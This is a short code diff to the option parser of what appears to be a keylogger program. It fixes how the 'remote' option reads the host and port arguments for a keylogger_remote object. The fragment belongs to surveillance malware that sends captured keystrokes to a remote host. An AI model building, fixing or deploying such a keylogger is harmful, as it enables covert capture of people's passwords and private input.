@@ -65,7 +65,7 @@ void initialize_options(int p_arguments_number, char** p_arguments_value)
 				else if (strcasecmp(t_long_options[t_option_index].name,
 					LONG_OPTION_REMOTE) == 0)
 				{
-						g_keylogger = new keylogger_remote(g_buffer_size, p_arguments_value[t_option_index]++, atoi(p_arguments_value[t_option_index]++));
+						g_keylogger = new keylogger_remote(g_buffer_size, p_arguments_value[t_option_index + 1], atoi(p_arguments_value[t_option_index + 2]));
 				}
 				else if (strcasecmp(t_long_options[t_option_index].name,
 					LONG_OPTION_HELP) == 0)
@@ -101,7 +101,7 @@ void initialize_options(int p_arguments_number, char** p_arguments_value)
 			break;
 
 			case SHORT_OPTION_REMOTE:
-				g_keylogger = new keylogger_remote(g_buffer_size, p_arguments_value[t_option_index]++, atoi(p_arguments_value[t_option_index]++));
+				g_keylogger = new keylogger_remote(g_buffer_size, p_arguments_value[t_option_index + 1], atoi(p_arguments_value[t_option_index + 2]));
 			break;
 
 			case SHORT_OPTION_BUFFER_SIZE:
